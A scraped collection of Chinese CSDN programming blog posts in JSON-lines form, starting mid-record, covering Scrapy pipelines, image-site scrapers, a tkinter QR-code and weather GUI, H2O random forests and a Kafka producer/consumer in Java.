spider):\n        self.file.write(bytes(str(item),encoding='utf-8'))\n        # 这里的bytes是python3可以用的，如果是python2.7等出现问题你可以结合json模块进行数据的序列化，然后存储就可以了。\n        return item\n\n\n上面我们定义了两个管道，接下来我们就考虑如何调用这两个管道了。\n\n在settings.py里面我们要更改一些设置。除了上篇讲到的设置外还有\n\n\n\nITEM_PIPELINES = {\n    'mypipeline.pipelines.MypipeimageslinePipeline':1,\n   'mypipeline.pipelines.MyitemPipeline': 300\n}\n\n数字越小，管道的优先级越高，优先调用。数字控制在0~1000. \n其余的设置请参考上一篇文章。\n\n至于items.py文件就是定义item\n\n\n\nimport scrapy\n# 直接导入*from scrapy import Field*会更方便哦\n\nclass MypipelineItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    quote = scrapy.Field()\n    director = scrapy.Field()\n    time = scrapy.Field()\n    rate = scrapy.Field()\n    title = scrapy.Field()\n    short = scrapy.Field()\n    my_images_urls = scrapy.Field()\n    my_images = scrapy.Field()\n    image_path = scrapy.Field()\n\n\n那么，这就是，整个文章的内容。有什么不懂的，欢迎询问，还有，开源项目，欢迎留言指导。", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/killeri/article/details/80228089", "title": "scrapy初探（自制管道和多个管道合用）"}
{"timestamp": "2018_08_14_11_12_28", "desc": "首先得解决环境和工具的问题 \nPython基础教程 \nPython3基础教程 \n大家也可以去慕课网看视频学习哦，关于选择Python2还是Python3的问题，上手的话还是直接选择3吧。\n\n\n\n关于爬虫\n\n爬虫就是在互联网中执行爬取有用信息的程序，总的工作流程如下: \n找到爬虫入口->获取目标链接->下载网页-> 解析网页 -> 获取价值信息 ->存库（文件保存）操作\n\n首先给自己一个伟大的小目标吧！或许明天的UC头条就是，震惊！一16岁编程奇才爬取某社区2亿条用户数据。\n\n\n\n开始吧\n\n我们的目标就从一个图片网站开始吧，坐好啦，老司机要发车了 –> mzitu.com\n\n\n\nhttp://www.mzitu.com/all 每日更新页面给了我们一个很好的爬虫入口，良心站长，F12进入浏览器调试模式，更方便开发人员观察\n\n\n\n\n\n找到入口和目标链接之后开始下载网页\n\n\n\n# -*- coding: UTF-8 -*-\nfrom urllib import request\n\n#目标抓取网页\nsrc = 'http://www.mzitu.com/all'\n#浏览器请求头（大部分网站没有这个请求头可能会报错）\nmheaders = {'User-Agent':\"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\"}\n\n#读取一个网页\ndef getHtml(url):\n    req = request.Request(url,headers=mheaders) #添加headers避免服务器拒绝非浏览器访问\n    page = request.urlopen(req)\n    html = page.read()\n    return html.decode('utf-8')  # python3 python2版本直接返回html\n\nprint(getHtml(src))\n\n\n\nurllib.request.urlopen()请求你个网页，是不是so easy，各位看官，你老厉害了。\n\n拿到这个入口网页之后，我们顺着主线走，不要迷路了，那么入口网页里面用有的价值是什么了，当然是妹子，恩我们要奔着套路地址去，这里我们需要用到beautifulsoup4 ,当然高手一般都是使用正则表达式的，可是菜鸟真的合适吗，虽然bs4效率低一点，但是对开发人员友好啊。获取bs4方法,前提是你需要配置好python和pip（pip工具是python自带的）的环境变量，这里不赘述了\n\n\n  pip install beautifulsoup4\n\n\n好了，继续前行吧。去拿到我们的子目标，首先我们得明确子目标 \n\n\n\n\n# -*- coding: UTF-8 -*-\nfrom urllib import request\nfrom bs4 import BeautifulSoup\n\n#目标抓取网页\nsrc = 'http://www.mzitu.com/all'\n#浏览器请求头（大部分网站没有这个请求头可能会报错）\nmheaders = {'User-Agent':\"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\"}\n\n#读取一个网页\ndef getHtml(url):\n    req = request.Request(url,headers=mheaders) #添加headers避免服务器拒绝非浏览器访问\n    page = request.urlopen(req)\n    html = page.read()\n    return html.decode('utf-8')  # python3 python2版本直接返回html\n\n#从入口爬取所有的目标链接\ndef getallUrl(html):\n    #构造一个bs对象\n    soup = BeautifulSoup(html, 'html.parser')\n    #使用bs对象寻找class为all的div 然后再寻找这些div里面的a标签，可能我们需要多试几次才能准确的get\n    all = soup.find('div',class_='all').find_all('a')\n    for li in all:\n        print(li)\n\ngetallUrl(getHtml(src))\n\n\n\n行了，我们又有目标了，遍历这些目标，最后在子目标里面寻找最终目标，对最终目标进行存库（文件操作）即可完成我们这次探险了！ \n \n最后一段旅程需要各位生手自行探索，老衲先行告退。对了，地图拿走不谢：\n\n\n\n# -*- coding: UTF-8 -*-\nfrom urllib import request\nfrom bs4 import BeautifulSoup\nimport uuid\nimport time\n\n#目标抓取网页\nsrc = 'http://www.mzitu.com/all'\n#浏览器请求头（大部分网站没有这个请求头可能会报错）\nmheaders = {'User-Agent':\"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\"}\n\n#读取一个网页\ndef getHtml(url):\n    req = request.Request(url,headers=mheaders) #添加headers避免服务器拒绝非浏览器访问\n    page = request.urlopen(req)\n    html = page.read()\n    return html.decode('utf-8')  # python3 python2版本直接返回html\n\n#从入口爬取所有的目标链接\ndef getallUrl(html):\n    #构造一个bs对象\n    soup = BeautifulSoup(html, 'html.parser')\n    #使用bs对象寻找class为all的div 然后再寻找这些div里面的a标签，可能我们需要多试几次才能准确的get\n    all = soup.find('div',class_='all').find_all('a')\n    print(len(all))#无聊打印点什么\n    for li in all:\n        subSrc = li.attrs['href']\n        subHtml = getHtml(subSrc)\n        subSoup = BeautifulSoup(subHtml, 'html.parser')\n        page = subSoup.find('div', class_='pagenavi').find_all('span')\n        #page[-2]是表示数组从右(末端数2个) maxpage拿到套图最后一页\n        maxPage = page[-2].get_text()\n        i = 1\n        while (i <= int(maxPage)):\n            time.sleep(0.08) #休息0.08s，防止服务器拒绝频繁请求\n            tagetSrc = subSrc + '/' + str(i)\n            tagetHtml = getHtml(tagetSrc)\n            tagetSoup = BeautifulSoup(tagetHtml, 'html.parser')\n            img = tagetSoup.find('div', class_='main-image').find('img')\n            print(time.time())#无聊打印点什么\n            #uuid()构造一个世界唯一字符串，为了防止文件重名\n            name = img.attrs['alt'] + str(uuid.uuid4())\n            imgsrc = img.attrs['src']\n            print(imgsrc + \"-----\" + name)#无聊打印点什么\n            try:\n                #这里的指定存储路径，需要注意的是这里需手动创建文件夹，如需自动想、可以使用os库\n                request.urlretrieve(imgsrc, 'D:\\\\meizi\\\\' + '%s.jpg' % name)  # 指定目录位置\n            except BaseException:\n                #捕获异常情况\n                print('Error:there is something wrong!')\n                # 遇到IOError: [Errno socket error] [Errno 10060]服务器拒绝频繁访问 阻塞1s\n                time.sleep(1)\n                try:\n                    request.urlretrieve(imgsrc, 'D:\\\\meizi\\\\' + '%s.jpg' % name)  # 指定目录位置\n                except BaseException:\n                    print('Error:there is something wrong!over')\n            # print(tagetSrc)\n            i += 1\n        print('end')\n#开始\nprint('begin')\ngetallUrl(getHtml(src))\n#结束\nprint('over')\n\n\n成果 \n\n\n好了，这次旅行到此结束，对于这次初次旅程还满意吗？给各位老厉害的看官留几个宝箱吧： \n1.这种方式爬取数据存在什么弊端？该怎么完善？ \n2.有什么方法提高爬取效率？ \n3.反面思考我们的web网站怎么防止被机器爬取数据？ \n4.我们的爬虫（机器）面对验证码，登录等问题怎么处理？ \n…\n\n\n\n最后\n\n谢谢站长", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/xiaoping0915/article/details/62420139", "title": "【Python】从爬虫开始吧——爬取妹子图整站"}
{"timestamp": "2018_08_14_11_12_28", "desc": "python爬虫不止可以批量下载数据，还可以有很多有趣的应用，之前也发过很多，比如天气预报实时查询、cmd版的实时翻译、快速浏览论坛热门帖等等，这些都可以算是爬虫的另一个应用方向！\n\n今天给大家分享一个二维码生成器的爬虫版本实现！\n\n\n\n爬虫思路\n\n网上有很多的二维码自动生成的网页，它可以将文本、名片、wifi分享等等都以二维码的形式生成，只需要用带有识别二维码的app就可以识别，比如手机浏览器一般就自带app哦！\n\nPS：这里，普及一个很重要点，不要用带有支付功能的app随便扫码（支付宝、微信等等）！！！不要用带有支付功能的app随便扫码（支付宝、微信等等）！！！不要用带有支付功能的app随便扫码（支付宝、微信等等）！！！重要的事情说三遍！\n\n那么，我们可以找到一个网页，通过requests的请求，去获得对方服务器生成的二维码，达到我们的目标！\n\n大致流程是这样的：\n\n请求URL==>构造请求表单==>获得服务器返回数据==>找到二维码图片地址==>下载图片\n\n\n\n代码\n\n代码其实很简单,短短20多行就可以\n\n\n\n比较复杂的部分就是里面有几个参数，背景颜色、大小、容错率、形态等等，这里是写好的，也可以做成可输入的，这样比较灵活！最后，把它们做成一个简单的桌面程序\n\n\n\n完整代码：\n\n\n\nimport requests\nfrom tkinter import *\nfrom PIL import Image,ImageTk\ndef get_ewm():\n    url = 'http://www.wwei.cn/qrcode-wwei_create.html'\n    strs = entry.get()\n    dat = {\n        'data[text]':strs,\n        'data[type]':'index',\n        'level':'L',#容错率 LMQH\n        'moban_id':0,\n        'qrid':0,\n        'size':555,#图像大小，单位px\n        'style_setting[bcolor]':'# ffffff',\n        'style_setting[fcolor]' : '# 000000',\n        'style_setting[inptcolor]':  '# 000000',\n        'style_setting[logo_border]': 0,\n        'style_setting[logo_height]':46,\n        'style_setting[logo_id]':'',\n        'style_setting[logo_width]':46,\n        'style_setting[mbtype_hb]':0,\n        'style_setting[protype]':2,#圆点、直角、液态 0\\1\\2\n        'style_setting[ptcolor]':'# 000000'}\n    html = requests.post(url,data=dat).json()\n    img_url =  html['png_url']\n    with open('123.png','wb') as f:\n        f.write(requests.get(img_url).content)\n    load = Image.open('123.png')\n    im1 = ImageTk.PhotoImage(load)\n    label = Label(tk, image=im1,compound = 'bottom')\n    label.image = im1\n    label.grid(row=2,columnspan=6)\nif __name__ == '__main__':\n    tk = Tk()\n    tk.title('二维码生成器')\n    tk.geometry('640x600+200+20')\n    entry = Entry(tk, font=('微软雅黑'),width=60)  # 创建输入框\n    entry.grid(row=1, column=4)  # 定位第1行3列\n    str_b = Button(tk,text='生成二维码',command=get_ewm)\n    str_b.grid(row=1,column=5)\n    tk.mainloop()\n\n\n如果想制作其他形式的，可以在主函数中继续添加entry控件接收参数，get_ewm()函数中自动调整相关参数就ok了！", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/programmer_yf/article/details/81143034", "title": "python有哪些好玩的应用实现，用python爬虫做一个二维码生成器"}
{"timestamp": "2018_08_14_11_12_28", "desc": "在学习Python的过程中，经常会写很多的练手的脚本，那么有没有想过，写到一起呢？当然了，方法有很多，比如写到web网页中，做各种跳转、写到微信中，各种回复关键字调用，还有今天和大家分享的GUI图形用户界面！\n\n\n\n构建基本框架\n\nPython中有标准库tkinter，不需要安装即可使用！可以用来写简单的GUI程序，只需要短短几行代码就可以了，比如下面这个：\n\n\n\n具体教程大家可以去自行搜索，这里就不一一细说了，注释也写的很清楚！\n\n\n\n将自己的其他脚本都写到GUI程序中\n\n其实可以导入其他脚本中的函数，来达到多个脚本整合的效果，但是那样又不是很方便，就先放到一起了，慢慢在完善！\n\n首先是将之前的天气预报写入（这里有个城市代码的字典省略了，很长，大家可以去我相关的文章中查找）\n\n\n\ndef weather():\n    ''' 天气预报查询  '''\n    global city_code_list#城市列表\n    city = entry.get()#获取输入的城市名\n    if city in city_code_list:\n        city_code = city_code_list[city]\n        home_page = 'http://www.weather.com.cn'\n        url = home_page + '/weather/' + city_code + '.shtml'\n        header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'}\n        res = requests.get(url, headers=header)\n        res.encoding = 'utf-8'\n        html = etree.HTML(res.text)\n        for i in range(1, 8):\n            date = html.xpath('//ul[@class=\"t clearfix\"]/li[{}]/h1/text()'.format(i))[0]\n            weather = html.xpath('//ul[@class=\"t clearfix\"]/li[{}]/p[1]/text()'.format(i))[0]\n            tem1 = html.xpath('//ul[@class=\"t clearfix\"]/li[{}]/p[@class=\"tem\"]/span/text()'.format(i))\n            tem2 = html.xpath('//ul[@class=\"t clearfix\"]/li[{}]/p[@class=\"tem\"]/i/text()'.format(i))\n            tem = \"\".join(tem1) + '/' + \"\".join(tem2)\n            win1 = html.xpath('//ul[@class=\"t clearfix\"]/li[{}]/p[@class=\"win\"]/i/text()'.format(i))\n            win2 = html.xpath('//ul[@class=\"t clearfix\"]/li[{}]/p[@class=\"win\"]/em/span[1]/@title'.format(i))\n            win = \"\".join(win1) + \"\".join(win2)\n            text.insert(END,'%s天气预报查询'%city)#添加数据\n            text.insert(END,'%s %s %s %s'%(date, weather, tem, win))#添加数据\n            text.see(END)#文本框向下滚动\n            text.update()#更新\n    else:\n        text.insert(END, '输错了吧？')  # 添加数据\n        text.see(END)  # 文本框向下滚动\n        text.update()  # 更新\n\n\n然后是空气质量排名\n\n\n\ndef ranking():\n    city = entry.get()\n    url = 'http://www.tianqihoubao.com/aqi/aqi_rank.html'\n    html = requests.get(url)\n    datas = etree.HTML(html.text).xpath('//table[@class=\"b\"]')[0]\n    i = 1\n    for data in datas:\n        trs = data.xpath('./td')\n        info = []\n        for tr in trs:\n            a = tr.xpath('string(.)').split()[0]\n            if i % 6 != 0:\n                info.append(a)\n            elif i == 6:\n                text.insert(END, '%s' % (\" | \".join(info))) # 第一行\n            elif city in info:#判断需要数据所在行\n                text.insert(END, '%s' % (\"   |   \".join(info)))  # 添加需要的数据\n                text.see(END)  # 文本框向下滚动\n                text.update()  # 更新\n                info = []\n            i += 1\n\n最后是空气指数查询\n\n\n\ndef quality():\n    url = 'http://www.tianqihoubao.com/aqi/'\n    html = requests.get(url)\n    html.encoding = 'gbk'\n    citys = etree.HTML(html.text).xpath('//div[@class=\"citychk\"]/dl/dd/a/text()')\n    city_urls = etree.HTML(html.text).xpath('//div[@class=\"citychk\"]/dl/dd/a/@href')\n    dic = {}#构架城市列表\n    for city, city_url in zip(citys, city_urls):\n        city = city.replace(\" \", \"\")\n        city_url = 'http://www.tianqihoubao.com/' + city_url\n        dic[city] = city_url\n    city_n = entry.get()\n    if city_n in dic.keys():\n        html_n = requests.get(dic[city_n])\n        html_n.encoding = 'gbk'\n        data = etree.HTML(html_n.text)\n        num = data.xpath('//div[@class=\"num\"]/text()')[0].strip()\n        status = data.xpath('//div[@class=\"status\"]/text()')[0].strip()\n        explain = data.xpath('//div[@class=\"hd\"]/div[@id=\"content\"]/div[@class=\"txt01\"]/h4')[0].xpath('string(.)')\n        surveys = re.findall(r'<td.*?>(.*?)</td>', html_n.text, re.S)\n        sur = re.sub(\"</b>\", \"|\", ''.join([x.strip().replace(\"<b>\", ' ') for x in surveys[0:9]]))[:-1]\n        sur2 = [x.strip().replace(\" \", '') + '|' for x in surveys[9:]]\n        surv = [sur2[i:i + 9] for i in range(0, len(sur2), 9)]\n        text.insert(END,'%s空气质量查询' % city_n)  # 添加数据\n        text.insert(END,\"%s空气质量指数: %s\" % (city_n, num))  # 添加数据\n        text.insert(END,\"%s空气质量：    %s\" %(city_n, status))  # 添加数据\n        text.insert(END,explain)  # 添加数据\n        text.insert(END,sur)  # 添加数据\n        for su in surv:\n            text.insert(END,\" \".join(su)[:-1])  # 添加数据\n        text.see(END)  # 文本框向下滚动\n        text.update()  # 更新\n    else:\n        text.insert(END, '输错了吧？')  # 添加数据\n        text.see(END)  # 文本框向下滚动\n        text.update()  # 更新\n\n好了，现在是主函数\n\n\n\nif __name__ == '__main__':\n    root = Tk()\n    root.title(\"我的应用汇总\")#窗口标题\n    root.geometry('660x600+600+50')#窗口大小位置 用x链接 +后面是位置\n    label = Label(root,text=\"<<-----云飞学编程----Q群542110741----->>\",font=('微软雅黑'))#创建标签控件\n    label.grid(row=0,columnspan=3)#网格式布局\n    text = Listbox(root,font=('微软雅黑',15),width=55,height=18)#列表框控件,设置组件默认宽高\n    text.grid(row=2,columnspan=4)#columnspan为组件所跨越的列数\n    button_tq = Button(root,text=\"天气预报查询\",font=('微软雅黑',8),command=weather)#点击按钮\n    button_tq.grid(row=1,column=1)\n    button_kq = Button(root,text=\"空气质量查询\",font=('微软雅黑',8),command=quality)#点击按钮\n    button_kq.grid(row=1,column=3)\n    button_pm = Button(root,text=\"空气质量排名\",font=('微软雅黑',8),command=ranking)#点击按钮\n    button_pm.grid(row=1,column=2)\n    entry = Entry(root,font=('微软雅黑'))#创建输入框\n    entry.grid(row=1,column=0)#定位第1行3列\n    root.mainloop()\n\n运行效果如下：\n\n\n\n上面3个爬虫，都在以往的文章中发过，大家如果感兴趣可以去看看！这里就不详细注释了，只是复制过来稍微修改下就用了！\n\n\n\n待改进：\n\n1、内容添加，目前就3个爬虫的内容，慢慢添加更多的感兴趣的内容进去，最终形成自己的定制软件\n\n2、界面的优化，比如滑动条、字体大小、按钮大小位置等等\n\n3、连接数据库，目前的内容都是实时抓取网页内容，连接数据库会更加的快捷\n\n目前就这么多，想到在继续吧！刚开始学习GUI，总有不足之处，如果有更好的建议大家可以评论区讨论哦！需要源码的话就私信我吧！", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/programmer_yf/article/details/80992834", "title": "Python学习，给自己的代码做个合集，定制自己的桌面软件！"}
{"timestamp": "2018_08_14_11_12_28", "desc": "简介\n\nPython可以进行网络爬虫的故事已经不是新鲜事了，但是用爬虫开车抓图的老司机可数量不多。\n\n这次要实现的是Python的”老司机功能”，利用了多个网络相关的模块：re正则表达式模块，用于解析html内的标签；os操作系统模块，用于管理文件；urllib网页模块，用于下载和转译html内容；urlparse网址解析模块，用于提取域名等信息。\n\n\n\n\n\n正片\n\n废话不多说，驾照在此：\n\n\n\n#coding=utf-8\nimport urllib\nimport re\nimport os\nimport urlparse\n\n# 用于匹配正则式,返回匹配结果\n# 用法regFind(表达式,文本内容)\ndef regFind(reg,text):\n    pattern  =  re.compile(reg)\n    return re.findall(pattern,text)\n\n# 用于获取html源,返回对应文本内容\ndef getHtml(url):\n    page = urllib.urlopen(url)\n    html = page.read()\n    return html\n\n# 保存图片列表至对应路径\n# 用法saveGraph(路径,图片url列表)\ndef saveGraph(readyPath,imglist):\n    x = 0\n    for imgurl in imglist:\n        urllib.urlretrieve(imgurl,readyPath+'\\\\%s.jpg' % x)\n        x += 1\n    return x\n\n# 抽取html内的图像\ndef getImg(html):\n    imglist = regFind(r'<img.*?src=\"(.+?\\.jpg)\".*?>',html)   #解析图像列表\n    print \"解析出图像\" + str(len(imglist)) + '张'\n    titlelist = regFind(r'<head>[\\s\\S]*<title>([\\s\\S]*)</title>[\\s\\S]*</head>',html)  #解析出标题\n    htmlTitle = titlelist[0]       #从list中提取出title的字符串变量\n    print htmlTitle\n    readyPath = '.\\\\GraphFile\\\\'+htmlTitle\n    x = 0                          # 图片计数器\n    if not (os.path.exists(readyPath) and len(os.listdir(readyPath)) == len(imglist) ):\n        # 如果不同时满足(文件夹存在和图片下载完整)则需要新下载所有内容\n        # 尝试创建目录\n        if not os.path.exists(readyPath):\n            try:\n                os.mkdir(readyPath)    \n            except Exception,e:\n                print \"文件夹创建异常:\",htmlTitle,Exception,\":\",e  # 防止新建文件夹异常\n        # 录建立后下载图片\n        if os.path.exists(readyPath):\n            x = saveGraph(readyPath,imglist)\n\n    print '获取图片' + str(x) + '张'\n\nclass Config():\n    def __init__(self,configFileName = 'store_html.ini'):\n        self.configFileName = configFileName\n\n    def LoadConfig(self):\n        if not os.path.exists(self.configFileName):\n            return ''\n        file_object = open(self.configFileName, 'r')\n        try:\n             fileText = file_object.read()\n        finally:\n             file_object.close()\n        return fileText\n\n    def SaveConfig(self,text):\n        file_object = open(self.configFileName, 'w')\n        try:\n             all_the_text = file_object.write(text)\n        finally:\n             file_object.close()\n\nif __name__ == \"__main__\":\n    ConfigObj = Config()\n    webAddr = ConfigObj.LoadConfig()\n    if webAddr == '' :\n        print \"目前没有读到上次结束的地址\"\n        while 1:\n            text = input('输入一个url,退出输入exit: ')\n            if text == 'exit':\n                exit()\n            elif text != '':\n                webAddr = text\n                break\n            else:\n                print '输入无效'\n\n    deepth = 2      # 爬虫深度\n    print '本次服务将执行:' + str(deepth) + '次'\n\n    # 尝试创建子文件夹\n    readyPath = '.\\\\GraphFile'\n    if not os.path.exists(readyPath):\n        os.mkdir(readyPath)\n\n    for i in range(0, deepth):\n        print '--------------------分割线----------------------------'\n        print unicode('URL地址为 ' , \"utf8\")+ webAddr\n        htmlText = getHtml(webAddr)\n        getImg(htmlText)\n        GraspList = regFind(r'<a href=(.+?\\.html)>.*?</a>',htmlText)\n        try :\n            webAddr = 'http://' + urlparse(webAddr).netloc + GraspList[1]    #爬虫目标地址\n        except Exception,e:\n            print \"爬虫地址异常:\",Exception,\":\",e\n            webAddr = 'http://' + urlparse(webAddr).netloc + GraspList[0]    #爬虫目标地址\n\n    #保存下一次的爬虫地址\n    ConfigObj.SaveConfig(webAddr)\n\n\n\n\n\n\n开车指南\n\n初次上路，会出现下面的对话：\n\n\n\n目前没有读到上次结束的地址\n输入一个url,退出输入exit:\n\n直接输入一个已知的目标页网址，会直接开始解析网页，至于网址嘛，为师只能指点你到这了，O(∩_∩)O~\n\n脚本里有个设置爬虫次数的语句，可按需修改：\n\ndeepth = 2      # 爬虫深度\n\n如果一切正常，程序会将下一次脚本的起始网址保存在文件夹下的store_html.ini内，下载的内容保存在\\GraphFile目录下。\n\n如果需求还不满足，重新执行这个脚本继续运行，and enjoy。最后祝各位，have a nice day！", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/domybest111/article/details/54664839", "title": "用Python开车的老司机"}
{"timestamp": "2018_08_14_11_12_28", "desc": "1.安装H2o\n\ncmd:输入pip install h2o\n\n\n\n\n\n2.启动\n\n\n\npython\nimport h2o\nh2o.init()\n\n\n\n启动成功之后可以在浏览器中输入：localhost:54321 \n\n\n\n\n3.数据准备\n\n使用到的数据在我的github \n\n\n\n\n3.建模\n\na.读入数据 \n\n\n\n\nb.解析文件 \n\n\nc.查看Job \n\n\nd.创建模型 \n\n\ne.选择随机森林 \n \nf.选择特征，响应列，其他参数按需调整 \n \ng.参数填好之后，建模\n\n\n\nh.查看Job \n \ni.随机森林数的数量与trainlogloess之间的关系 \n \nj.各个属性的重要程度 \n\n\n\n\n4.分类\n\na.导入测试集 \n \nb.接下来几个步骤建模时候的一样，这里就不赘述 \nc.预测 \n\n\n\n\nd.分类结果 \n\n\ne.将分类结果与测试集合并 \n\n\nf.将合并结果导出 \n\n\n\n\n进度条跑到百分之百就说明导出成功 \n\n\n得到的结果，比之前的测试集多了三列\n\n\n\n\n\n5.使用IDE的代码编写\n\n\n\n\n# coding: utf-8\n\n# In[1]:\n\nimport h2o\nh2o.init()\n\n\n# In[75]:\n\ntrainFrame =h2o.import_file(\"C:\\\\Users\\\\gpwner\\\\Desktop\\\\train.csv\")[2:]\nnames=trainFrame.col_names[:-1]\nresponse_column = 'Catrgory'\n\n\n# In[37]:\n\nfrom h2o.estimators import H2ORandomForestEstimator\n# Define model\nmodel = H2ORandomForestEstimator(ntrees=50, max_depth=20, nfolds=10)\nmodel.train(x=names,y=response_column,training_frame=trainFrame)\n\n\n# In[84]:\n\ntestdata =h2o.import_file(\"C:\\\\Users\\\\gpwner\\\\Desktop\\\\test.csv\")[2:]\npre_tag=H2ORandomForestEstimator.predict(model ,testdata)\npre_tag['predict']\nresultdata=testdata.cbind(pre_tag['predict'])\nresultdata\nh2o.download_csv(resultdata,\"C:\\\\Users\\\\gpwner\\\\Desktop\\\\predict.csv\")\n\n\n# In[82]:\n\nfrom __future__ import division\ncorrect=resultdata[resultdata['Catrgory']==resultdata['predict']]\nprint(float(len(correct)/len(resultdata)))", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/gpwner/article/details/74058850", "title": "Python<H2o使用分布式随机森林建模分类>"}
{"timestamp": "2018_08_14_11_12_28", "desc": "本例使用的是 \nkafka_2.10-0.10.2.1 \n为了说明问题，生产者和消费者都是使用单线程形式\n\n\n\n1.附上生产者的代码：\n\n\n\n\npublic class Producer {\n    private final KafkaProducer<String, String> producer;\n    private final String topic;\n\n    public Producer(String topic, String[] args) {\n        Properties props = new Properties();\n        props.put(\"bootstrap.servers\", \"172.17.11.85:9092,172.17.11.86:9092,172.17.11.87:9092\");\n        props.put(\"client.id\", \"DemoProducer\");\n        props.put(\"batch.size\", 16384);//16M\n        props.put(\"linger.ms\", 10);\n        props.put(\"buffer.memory\", 33554432);//32M\n        props.put(\"key.serializer\", \"org.apache.kafka.common.serialization.StringSerializer\");\n        props.put(\"value.serializer\", \"org.apache.kafka.common.serialization.StringSerializer\");\n\n        producer = new KafkaProducer<>(props);\n        this.topic = topic;\n    }\n\n    public void producerMsg() throws InterruptedException {\n        String data = \"Apache Storm is a free and open source distributed realtime computation system Storm makes it easy to reliably process unbounded streams of data doing for realtime processing what Hadoop did for batch processing. Storm is simple, can be used with any programming language, and is a lot of fun to use!\\n\" +\n                \"Storm has many use cases: realtime analytics, online machine learning, continuous computation, distributed RPC, ETL, and more. Storm is fast: a benchmark clocked it at over a million tuples processed per second per node. It is scalable, fault-tolerant, guarantees your data will be processed, and is easy to set up and operate.\\n\" +\n                \"Storm integrates with the queueing and database technologies you already use. A Storm topology consumes streams of data and processes those streams in arbitrarily complex ways, repartitioning the streams between each stage of the computation however needed. Read more in the tutorial.\";\n        data = data.replaceAll(\"[\\\\pP‘’“”]\", \"\");\n        String[] words = data.split(\" \");\n        Random _rand = new Random();\n\n        Random rnd = new Random();\n        int events = 10;\n        for (long nEvents = 0; nEvents < events; nEvents++) {\n            long runtime = new Date().getTime();\n            int lastIPnum = rnd.nextInt(255);\n            String ip = \"192.168.2.\" + lastIPnum;\n            String msg = words[_rand.nextInt(words.length)];\n            try {\n                producer.send(new ProducerRecord<>(topic, ip, msg));\n                System.out.println(\"Sent message: (\" + ip + \", \" + msg + \")\");\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    public static void main(String[] args) throws InterruptedException {\n        Producer producer = new Producer(Constants.TOPIC,args);\n        producer.producerMsg();\n        Thread.sleep(20);\n    }\n}\n\n\n\n  \n    要想实现批量发送消息的下面这两行的至关重要，第一行配置每一批的大小为16M,第二行配置每隔10ms一发送，这意味着你的主线程要能执行10ms以上才能销毁，否则无法发送消息到broker中 \n       props.put(“batch.size”, 16384);//16M \n        props.put(“linger.ms”, 10);\n\n \n这里相当重要！！！！！！！！！！！ \n如果你的代码在你指定的linger.ms时间内运行完了，那你就需要想办法增加你的程序运行时间了，我这里使用最简单的办法，让main线程挂起20ms\n\n\n\n2.附上消费者的代码\n\n\n\n\npublic class Consumer {\n    private final KafkaConsumer<Integer, String> consumer;\n    private final String topic;\n\n    public Consumer(String topic) {\n        Properties props = new Properties();\n        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, \"172.17.11.85:9092,172.17.11.86:9092,172.17.11.87:9092\");\n        props.put(\"zookeeper.connect\", \"172.17.11.85:218,172.17.11.86:2181,172.17.11.87:2181\");\n        props.put(ConsumerConfig.GROUP_ID_CONFIG, Constants.GROUP);\n        props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \"true\");\n        props.put(ConsumerConfig.AUTO_COMMIT_INTERVAL_MS_CONFIG, \"1000\");\n        props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \"latest\");//latest,earliest\n        props.put(ConsumerConfig.SESSION_TIMEOUT_MS_CONFIG, \"30000\");\n        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.StringDeserializer\");\n        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.StringDeserializer\");\n\n        consumer = new KafkaConsumer<>(props);\n        this.topic = topic;\n    }\n\n    public void consumerMsg(){\n        try {\n            consumer.subscribe(Collections.singletonList(this.topic));\n            while(true){\n                ConsumerRecords<Integer, String> records = consumer.poll(1000);\n                for (ConsumerRecord<Integer, String> record : records) {\n                    System.out.println(\"Received message: (\" + record.key() + \", \" + record.value() + \") at partition \"+record.partition()+\" offset \" + record.offset());\n                }\n            }\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        Consumer Consumer = new Consumer(Constants.TOPIC);\n        Consumer.consumerMsg();\n    }\n\n}", "time": "2018_08_14_11_12_28", "link": "https://blog.csdn.net/gpwner/article/details/73864601", "title": "Kafka2.10<使用JavaAPI 批量发送生产数据>"}
